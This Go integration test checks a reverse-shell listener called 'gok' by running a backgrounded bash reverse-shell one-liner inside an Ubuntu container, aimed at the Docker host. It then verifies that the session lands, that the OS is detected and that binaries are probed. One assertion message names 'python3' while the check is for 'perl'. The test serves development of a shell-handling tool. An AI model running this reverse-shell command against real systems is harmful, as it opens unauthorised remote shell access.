//go:build integration

package main

import (
  "fmt"
  "testing"
  "time"

  "github.com/stretchr/testify/require"
)

func TestRevshellSimple(t *testing.T) {
  // adjust test delay

  // start gok core 
  hostIP := "0.0.0.0"     // Bind gok to listen on all interfaces
  connectIP := "172.17.0.1" // Docker ip
  hostPort := 9001

  // Start gok core in headless/test mode
  cfg := Config{
    PortRange: PortRange{ Ports: []int{hostPort} },
    bindIps:   []string{hostIP},
    // NOTE: Test/Headless mode
    HeadlessMode: true,
    ProbingCmdTimeout: 200 * time.Millisecond,
  }
  core := NewCore(cfg)
  go core.Start()

  // Start the test container
  tc := StartContainer(t, "ubuntu:22.04")

  // start revshell in test container
  revCmd := fmt.Sprintf("nohup bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &", connectIP, hostPort)
  _ , err := tc.Exec(t, []string{"bash", "-c", revCmd})
  if err != nil {
    t.Fatal(err)
  }

  // TEST: Session lands
  require.Eventually(t, func() bool {
    sessions := core.SessionManager.GetSessions()
    return len(sessions) == 1
  }, 2*time.Second, 50*time.Millisecond, "Expected one session to be established")


  // TEST: OS of Session should be Linux
  require.Eventually(t, func() bool {
    s, err := core.SessionManager.Get(0)
    if err != nil { return false }
    s.mu.Lock()
    defer s.mu.Unlock()
    return s.SystemInfo.OS == Linux
  }, 2*time.Second, 100*time.Millisecond, "Expected session OS to be Linux")


  // Wait for Prober to be initialized
  require.Eventually(t, func() bool {
    s, err := core.SessionManager.Get(0)
    if err != nil { return false }
    // Ideally we should lock, but checking for non-nil is atomic enough for this test check
    s.mu.Lock()
    defer s.mu.Unlock()
    return s.state == StateBackgrounded && s.Prober != nil
  }, 20*time.Second, 100*time.Millisecond, "Timed out waiting for Prober initialization")


  // TEST: Binaries: `which`, `perl` should be detected
  s, err := core.SessionManager.Get(0)
  require.NoError(t, err)
  binaries := s.Prober.getBinaries()
  require.Contains(t, binaries, "which", "Expected 'which' binary to be detected")
  require.Contains(t, binaries, "perl", "Expected 'python3' binary to be detected")

}

